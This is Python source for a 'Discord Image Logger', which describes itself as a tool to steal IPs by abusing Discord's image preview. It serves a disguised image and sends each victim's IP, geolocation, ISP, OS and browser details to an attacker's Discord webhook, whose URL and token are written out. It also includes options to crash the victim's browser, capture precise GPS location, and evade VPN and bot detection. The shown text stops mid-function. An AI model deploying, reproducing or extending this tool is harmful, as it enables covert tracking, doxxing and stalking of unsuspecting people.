# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1336508208105128028/PsOmeEzhlmfyPSbMOFb3MaK406NBlq3bKnJ9urjzTUuSyt1nNhKW7d0wuIEyr1zDUIP-",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
